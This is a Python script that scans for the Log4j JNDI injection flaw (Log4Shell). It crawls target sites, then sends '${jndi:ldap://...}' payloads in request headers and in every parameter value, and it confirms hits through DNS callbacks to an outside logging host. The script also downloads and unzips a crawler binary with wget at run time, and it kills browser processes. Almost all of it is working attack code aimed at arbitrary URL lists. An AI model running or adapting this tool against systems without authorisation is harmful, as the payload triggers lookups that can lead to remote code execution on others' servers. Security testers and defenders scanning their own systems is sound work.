#!/usr/bin/python3
# coding: utf-8

import simplejson
import subprocess
import requests
import os
import sys
import time
import queue
import warnings
import argparse
from loguru import logger
warnings.filterwarnings(action='ignore')


class ArgumentParse:
    def __init__(self):
        self.args = self.parse()

        self.args.urls = [self.args.url] if self.args.url else []
        if self.args.file:
            with open(self.args.file, 'r', encoding='utf8') as f:
                for url in f.readlines():
                    self.args.urls.append(url.strip())

        self.args.chrome_path = self.args.chrome_path if self.args.chrome_path else '/usr/bin/chromium-browser'
        if not self.args.payload:
            self.args.dnslog = Dnslog()
            self.args.payload = '${jndi:ldap://' + self.args.dnslog.domain + '/exp}'

    def parse(self):
        parser = argparse.ArgumentParser(description='')
        parser.add_argument("-u", "--url", dest="url", help="Check a single URL.", action='store', default=None)
        parser.add_argument("-f", "--file", dest="file", help="file containing url.", action='store', default=None)
        parser.add_argument("-c", dest="chrome_path", help="Specify the chrome path.", action='store', default=None)
        parser.add_argument("-p", "--payload", dest="payload", help="Specify the payload like ${jndi:ldap://xx}.", action='store', default=None)
        args = parser.parse_args()
        return args


def download_crawlergo():
    while True:
        if not os.path.exists('crawlergo'):
            logger.info('Downloading crawlergo')
            time.sleep(5)
            os.system('wget https://github.com/0Kee-Team/crawlergo/releases/download/v0.4.0/crawlergo_linux_amd64.zip')
            os.system('unzip crawlergo_linux_amd64.zip')
        else:
            break


class Dnslog:
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Log4Scan:
    def __init__(self, args, target):
        self.args = args
        self.queue = queue.Queue()
        self.target = target
        self.r = 0
        logger.add('log.log')

    def craw(self):
        logger.info('start to craw {}'.format(self.target))
        cmd = ["./crawlergo", "-c", self.args.chrome_path, "-o", "json", "-t", "5", "--wait-dom-content-loaded-timeout", "15s", self.target]
        rsp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = str(rsp.stdout, encoding='utf-8')
        result = simplejson.loads(output.split("--[Mission Complete]--")[1])
        req_list = result["req_list"]
        for r in req_list:
            self.queue.put(r)
            logger.info(r)
        logger.info('craw end {}'.format(self.target))

    def repeat(self):
        logger.info('start to repeat {}'.format(self.target))
        while True:
            print(self.queue.qsize())
            if not self.queue.empty():
                
                package = self.queue.get()
                print(package)
                url = package['url'].replace('https', 'http')
                method = package['method']
                headers = package['headers']
                headers['User-Agent'] = self.args.payload
                headers['Referer'] = self.args.payload
                # headers['Content-Type'] = 'application/x-www-form-urlencoded'
                data = package['data']

                try:
                    resp = None
                    if method.lower() == 'get':
                        if '=' not in url:
                            continue
                        url = self.replace_values(url)
                        resp = requests.get(url=url, headers=headers, timeout=30, verify=False)
                    elif method.lower() == 'post':
                        if '=' not in data:
                            continue
                        data = self.replace_values(data)
                        resp = requests.post(url=url, headers=headers, data=data, timeout=30, verify=False)
                    logger.info(resp.status_code, method, url, data)
                except Exception as e:
                    print(e)
                finally:
                    dnslog_result = self.args.dnslog.pull_logs()
                    logger.info(self.args.dnslog)
                    print(dnslog_result)
                    if dnslog_result:
                        logger.info(f'{self.target} is vulnerable.')
                        logger.info('*'*8 + str(dnslog_result) + '*'*8)
            else:
                break
                logger.info('repeat end {}'.format(self.target))
        self.r = 1

    def replace_values(self, data):
        new_data = ''
        try:
            if '&' in data:
                for d in data.split('&'):
                    new_data += '{key}={value}&'.format(key=d[:d.index('=')], value=self.args.payload)
            else:
                new_data += '{key}={value}'.format(key=data[:data.index('=')], value=self.args.payload)
            new_data = new_data.strip('&')
            print(new_data)
            return new_data
        except Exception as e:
            logger.error(e)
            return data

    # chromium 
    # apt-get install -y procps
    def kill_process(self):
        if os.path.exists('/proc/1/cgroup') and 'docker' in os.popen('cat /proc/1/cgroup').read():
            print('kill_process')
            cmd = "ps aux | grep 'chromium' | grep -v grep | awk '{{print $2}}'"
            while True:
                process = os.popen(cmd).read()  
                if process:
                    os.popen('nohup kill -9 {} 2>&1 &'.format(process.replace('\n', ' ')))
                else:
                    break

if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print('\n%s -h for help.' % (sys.argv[0]))
        exit(0)

    print('''
             _                _  _   _ ____      ____
    | |    ___   __ _| || | (_)___ \    / ___|  ___ __ _ _ __  _ __   ___ _ __
    | |   / _ \ / _` | || |_| | __) |___\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
    | |__| (_) | (_| |__   _| |/ __/_____|__) | (_| (_| | | | | | | |  __/ |
    |_____\___/ \__, |  |_|_/ |_____|   |____/ \___\__,_|_| |_|_| |_|\___|_|
                |___/     |__/     by jshahjk@163.com. Illegal use is prohibited. 
    ''')

    download_crawlergo()
    arguments = ArgumentParse()
    for url in arguments.args.urls:
        log4j2scan = Log4Scan(arguments.args, url)
        log4j2scan.craw()
        log4j2scan.repeat()
        if log4j2scan.r == 1:
            log4j2scan.kill_process()
